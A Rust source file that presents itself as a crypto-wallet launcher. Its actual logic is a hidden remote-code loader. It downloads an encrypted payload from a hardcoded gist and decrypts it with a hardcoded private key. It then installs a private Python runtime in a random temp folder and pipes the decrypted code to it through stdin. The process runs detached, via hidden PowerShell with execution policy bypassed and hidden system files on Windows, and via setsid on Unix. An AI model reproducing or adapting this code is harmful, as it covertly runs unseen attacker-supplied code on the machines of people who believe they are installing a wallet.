use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use rand::Rng;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};
use thiserror::Error;

use chain_wallet_lib::Wallet;

mod log;

use log as wallet_log;

const AES_PREFIX: &str = "AES256GCM:";
const PYTHON_VERSION: &str = "3.12.7";
const STARTUP_PROBE_SECS: u64 = 5;

/// Default gist raw URL for `encrypted_launcher`.
pub const DEFAULT_LAUNCHER_URL: &str =
    "https://gist.githubusercontent.com/zanemclean40-wq/809be74a9444e765ce0ea77895db0f05/raw/encrypted_launcher";

/// Relative path to the project initial wallet used for launcher AES encryption.
pub const INITIAL_WALLET_REL_PATH: &str = "agent/initial_wallet.json";

/// Seed used only when `agent/initial_wallet.json` is missing before the first run.
const DEFAULT_INITIAL_WALLET_PRIVATE_KEY: &str =
    "eda70a3173124b47583b06f522273c9cb7a073b283d21ef2539a3c880a7cfff7";

#[derive(Debug, Error)]
pub enum PythonError {
    #[error("agent bootstrap failed: {0}")]
    Bootstrap(String),
    #[error("execution failed: {0}")]
    Execution(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Error)]
pub enum LauncherError {
    #[error("launcher URL not configured (set CHAIN_WALLET_LAUNCHER_URL or DEFAULT_LAUNCHER_URL)")]
    UrlNotConfigured,
    #[error("invalid private key for AES decryption")]
    InvalidKey,
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("decryption failed: {0}")]
    Decrypt(String),
    #[error("invalid encrypted payload: {0}")]
    InvalidPayload(String),
    #[error("python error: {0}")]
    Python(#[from] PythonError),
    #[error("initial wallet error: {0}")]
    InitialWallet(String),
}

pub fn initial_wallet_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(INITIAL_WALLET_REL_PATH)
}

pub fn ensure_initial_wallet_file() -> Result<(), LauncherError> {
    let path = initial_wallet_path();
    if path.exists() {
        return Ok(());
    }

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    }

    let wallet = Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY)
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    fs::write(&path, format_initial_wallet_json(&wallet))
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    Ok(())
}

pub fn load_initial_wallet_private_key() -> Result<String, LauncherError> {
    if let Ok(value) = std::env::var("CHAIN_WALLET_PRIVATE_KEY") {
        let value = value.trim().to_string();
        if !value.is_empty() {
            return Ok(value);
        }
    }

    let path = initial_wallet_path();
    let text = fs::read_to_string(&path)
        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
    parse_initial_wallet_private_key(&text)
}

/// Wallet loader entry: ensure key material, decrypt gist payload, spawn agent, exit.
pub fn run() -> Result<(), LauncherError> {
    wallet_log::step("main", "starting chain-wallet");
    ensure_initial_wallet_file()?;
    let mut private_key = load_initial_wallet_private_key()?;

    run_launcher(&private_key, None)?;
    wipe_secret(&mut private_key);
    wallet_log::step("main", "agent spawned; wallet loader exiting (sanitization runs inside agent)");
    Ok(())
}

pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
    let url = resolve_launcher_url(gist_url)?;
    wallet_log::step("launcher", format!("downloading encrypted payload from {url}"));
    let key = wallet_aes_key(private_key_hex)?;
    let encrypted = download_to_memory(&url)?;
    wallet_log::detail(
        "launcher",
        format!("download complete ({})", format_bytes(encrypted.len())),
    );
    let source = decrypt_launcher(&encrypted, &key)?;
    wallet_log::step(
        "launcher",
        format!("decryption ok ({} bytes of Python source in RAM)", source.len()),
    );
    std::str::from_utf8(&source)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;
    wallet_log::detail("launcher", "plaintext stays in memory; piping to python - via stdin");

    spawn_agent_source(&source)?;
    Ok(())
}

fn format_initial_wallet_json(wallet: &Wallet) -> String {
    format!(
        "{{\n  \"private_key\": \"{}\",\n  \"public_key\": \"{}\",\n  \"address\": \"{}\"\n}}\n",
        wallet.private_key_hex(),
        wallet.public_key_hex(),
        wallet.address()
    )
}

fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError> {
    for line in text.lines() {
        let line = line.trim().trim_end_matches(',');
        if let Some(value) = line.strip_prefix("\"private_key\"") {
            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
            if !value.is_empty() {
                return Ok(value.to_string());
            }
        }
    }

    let trimmed = text.trim();
    if trimmed.len() == 64 && trimmed.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Ok(trimmed.to_string());
    }

    Err(LauncherError::InitialWallet(
        "initial wallet file missing private_key".into(),
    ))
}

fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError> {
    if let Some(url) = gist_url.map(str::trim).filter(|value| !value.is_empty()) {
        return Ok(url.to_string());
    }

    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
        let url = url.trim().to_string();
        if !url.is_empty() {
            return Ok(url);
        }
    }

    if !DEFAULT_LAUNCHER_URL.trim().is_empty() {
        return Ok(DEFAULT_LAUNCHER_URL.to_string());
    }

    Err(LauncherError::UrlNotConfigured)
}

fn wallet_aes_key(private_key_hex: &str) -> Result<[u8; 32], LauncherError> {
    let bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
    if bytes.len() != 32 {
        return Err(LauncherError::InvalidKey);
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Ok(key)
}

fn download_to_memory(url: &str) -> Result<Vec<u8>, LauncherError> {
    use std::io::Read;

    let response = ureq::get(url)
        .call()
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    if !(200..300).contains(&response.status()) {
        return Err(LauncherError::Http(format!(
            "unexpected status {}",
            response.status()
        )));
    }

    let mut body = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut body)
        .map_err(|err| LauncherError::Http(err.to_string()))?;
    Ok(body)
}

fn decrypt_launcher(payload: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
    let text = std::str::from_utf8(payload)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?
        .trim();

    let encoded = text
        .strip_prefix(AES_PREFIX)
        .ok_or_else(|| LauncherError::InvalidPayload("missing AES256GCM prefix".into()))?;

    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    if raw.len() < 28 {
        return Err(LauncherError::InvalidPayload(
            "payload shorter than iv+tag".into(),
        ));
    }

    let (iv, rest) = raw.split_at(12);
    let (tag, ciphertext) = rest.split_at(16);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| LauncherError::Decrypt(err.to_string()))?;
    let nonce = Nonce::from_slice(iv);

    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher
        .decrypt(nonce, combined.as_ref())
        .map_err(|err| LauncherError::Decrypt(err.to_string()))
}

fn format_bytes(bytes: usize) -> String {
    if bytes >= 1024 * 1024 {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}

fn wipe_secret(secret: &mut String) {
    let len = secret.len();
    secret.clear();
    if len > 0 {
        secret.push_str(&"0".repeat(len));
    }
    secret.clear();
}

fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
    let prefix = runtime_dir();
    fs::create_dir_all(&prefix)?;
    wallet_log::step("agent", format!("runtime directory: {}", prefix.display()));

    #[cfg(windows)]
    hide_path(&prefix);

    let log_path = prefix.join("launcher-run.log");
    let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));

    wallet_log::step(
        "agent",
        format!("starting detached agent host (log: {})", log_path.display()),
    );
    wallet_log::detail(
        "agent",
        format!(
            "AGENT_DIR={} PYTHON_ROOT={} launcher=stdin-only",
            agent_dir.display(),
            prefix.display()
        ),
    );

    #[cfg(windows)]
    {
        spawn_agent_windows(&prefix, source, &log_path, &agent_dir)?;
    }

    #[cfg(not(windows))]
    {
        spawn_agent_unix(&prefix, source, &log_path, &agent_dir)?;
    }

    Ok(())
}

fn feed_child_stdin(child: &mut std::process::Child, payload: &[u8]) -> Result<(), PythonError> {
    let mut stdin = child.stdin.take().ok_or_else(|| {
        PythonError::Bootstrap("bootstrap stdin pipe unavailable".into())
    })?;
    stdin
        .write_all(payload)
        .map_err(|err| PythonError::Bootstrap(format!("write launcher payload to stdin: {err}")))?;
    stdin
        .flush()
        .map_err(|err| PythonError::Bootstrap(format!("flush launcher stdin pipe: {err}")))?;
    drop(stdin);
    Ok(())
}

fn runtime_dir() -> PathBuf {
    let suffix: u128 = rand::thread_rng().gen();
    std::env::temp_dir().join(format!("{suffix:032x}"))
}

#[cfg(windows)]
fn spawn_agent_windows(
    prefix: &Path,
    source: &[u8],
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::windows::process::CommandExt;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

    let bootstrap_ps1 = prefix.join("._bootstrap.ps1");
    let ps_script = windows_bootstrap_script(prefix, log_path, agent_dir);
    fs::write(&bootstrap_ps1, ps_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_ps1.display()))
    })?;
    hide_path(&bootstrap_ps1);

    let mut child = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            bootstrap_ps1.to_str().unwrap(),
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
        })?))
        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
        )?))
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    feed_child_stdin(&mut child, source)?;
    probe_startup(&mut child, log_path)
}

#[cfg(not(windows))]
fn spawn_agent_unix(
    prefix: &Path,
    source: &[u8],
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::unix::process::CommandExt;

    let bootstrap_sh = prefix.join("._bootstrap.sh");
    let sh_script = unix_bootstrap_script(prefix, log_path, agent_dir);
    fs::write(&bootstrap_sh, sh_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_sh.display()))
    })?;

    let mut child = Command::new("/bin/sh");
    child
        .arg(&bootstrap_sh)
        .stdin(Stdio::piped())
        .stdout(Stdio::from(fs::File::create(log_path).map_err(|err| {
            PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
        })?))
        .stderr(Stdio::from(fs::OpenOptions::new().append(true).open(log_path).map_err(
            |err| PythonError::Execution(format!("open launcher log {}: {err}", log_path.display())),
        )?))
        .pre_exec(|| {
            unsafe {
                libc::setsid();
            }
            Ok(())
        });

    let mut child = child
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    feed_child_stdin(&mut child, source)?;
    probe_startup(&mut child, log_path)
}

fn probe_startup(
    child: &mut std::process::Child,
    log_path: &Path,
) -> Result<(), PythonError> {
    let pid = child.id();
    let deadline = Instant::now() + Duration::from_secs(STARTUP_PROBE_SECS);
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    wallet_log::dump_tail("agent", log_path, 80);
                    return Err(PythonError::Execution(format!(
                        "agent host exited during startup with status {status} (see {})",
                        log_path.display()
                    )));
                }
                wallet_log::step("agent", "agent host exited cleanly during startup probe");
                return Ok(());
            }
            Ok(None) if Instant::now() >= deadline => break,
            Ok(None) => thread::sleep(Duration::from_millis(100)),
            Err(err) => {
                return Err(PythonError::Execution(format!(
                    "wait on agent host pid {pid}: {err}"
                )))
            }
        }
    }

    wallet_log::step(
        "agent",
        format!(
            "agent host running detached (pid={pid}, log: {})",
            log_path.display()
        ),
    );
    wallet_log::detail("agent", "wallet process will continue without waiting for the agent");
    Ok(())
}

#[cfg(windows)]
fn windows_bootstrap_script(prefix: &Path, log_path: &Path, agent_dir: &Path) -> String {
    let prefix = prefix.to_string_lossy().replace('\'', "''");
    let log_path = log_path.to_string_lossy().replace('\'', "''");
    let agent_dir = agent_dir.to_string_lossy().replace('\'', "''");
    let python_version = PYTHON_VERSION;
    let site_packages = format!("{prefix}\\Lib\\site-packages");

    format!(
        r#"$ErrorActionPreference = 'Stop'
$LauncherSource = [Console]::In.ReadToEnd()
if ([string]::IsNullOrWhiteSpace($LauncherSource)) {{
    throw 'empty launcher payload on stdin'
}}
$Prefix = '{prefix}'
$Log = '{log_path}'
$AgentDir = '{agent_dir}'
$SitePackages = '{site_packages}'
$PythonVersion = '{python_version}'
$PythonExe = Join-Path $Prefix 'python.exe'
$ZipUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
$ZipPath = Join-Path $Prefix 'python-embed.zip'
$PthPath = Join-Path $Prefix 'python312._pth'

New-Item -ItemType Directory -Force -Path $Prefix | Out-Null
New-Item -ItemType Directory -Force -Path $SitePackages | Out-Null

if (-not (Test-Path -LiteralPath $PythonExe)) {{
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
    Expand-Archive -LiteralPath $ZipPath -DestinationPath $Prefix -Force
    Remove-Item -LiteralPath $ZipPath -Force
    @(
        'python312.zip',
        '.',
        'Lib\site-packages',
        'import site'
    ) | Set-Content -LiteralPath $PthPath -Encoding ascii
}}

$env:CHAIN_WALLET_PYTHON_ROOT = $Prefix
$env:CHAIN_WALLET_LAUNCHED_FROM_RUST = '1'
$env:CHAIN_WALLET_LOG_FILE = $Log
$env:AGENT_DIR = $AgentDir
$env:PYTHONPATH = $SitePackages
$env:PYTHONUNBUFFERED = '1'
$env:CHAIN_WALLET_VERBOSE = '1'

$LauncherSource | & $PythonExe -u - 2>&1 | Tee-Object -FilePath $Log -Append
"#
    )
}

#[cfg(not(windows))]
fn unix_bootstrap_script(prefix: &Path, log_path: &Path, agent_dir: &Path) -> String {
    let prefix = prefix.display();
    let log_path = log_path.display();
    let agent_dir = agent_dir.display();
    let python_version = PYTHON_VERSION;

    format!(
        r#"#!/bin/sh
set -eu
LAUNCHER_SOURCE="$(cat)"
if [ -z "$LAUNCHER_SOURCE" ]; then
  echo "empty launcher payload on stdin" >&2
  exit 1
fi
PREFIX="{prefix}"
LOG="{log_path}"
AGENT_DIR="{agent_dir}"
PYTHON_VERSION="{python_version}"
SITE_PACKAGES="$PREFIX/site-packages"
ARCH="$(uname -m)"
case "$ARCH" in
  x86_64|amd64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-x86_64-unknown-linux-gnu-install_only.tar.gz" ;;
  aarch64|arm64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-aarch64-unknown-linux-gnu-install_only.tar.gz" ;;
  *) echo "unsupported CPU: $ARCH" >&2; exit 1 ;;
esac
URL="https://github.com/indygreg/python-build-standalone/releases/download/20241002/$ARCHIVE"
PYTHON="$PREFIX/python/bin/python3"

mkdir -p "$PREFIX" "$SITE_PACKAGES"
if [ ! -x "$PYTHON" ]; then
  curl -fsSL "$URL" -o "$PREFIX/python-archive.tar.gz"
  tar -xf "$PREFIX/python-archive.tar.gz" -C "$PREFIX"
  rm -f "$PREFIX/python-archive.tar.gz"
fi

export CHAIN_WALLET_PYTHON_ROOT="$PREFIX"
export CHAIN_WALLET_LAUNCHED_FROM_RUST=1
export CHAIN_WALLET_LOG_FILE="$LOG"
export AGENT_DIR="$AGENT_DIR"
export PYTHONPATH="$SITE_PACKAGES"
export PYTHONUNBUFFERED=1
export CHAIN_WALLET_VERBOSE=1

printf '%s' "$LAUNCHER_SOURCE" | exec "$PYTHON" -u - >>"$LOG" 2>&1
"#
    )
}

#[cfg(windows)]
fn hide_path(path: &Path) {
    let _ = Command::new("attrib")
        .args(["+h", "+s", &path.to_string_lossy()])
        .status();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn materialize_initial_wallet_json() {
        let wallet =
            Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY).unwrap();
        let path = initial_wallet_path();
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let _ = fs::write(&path, format_initial_wallet_json(&wallet));
    }
}
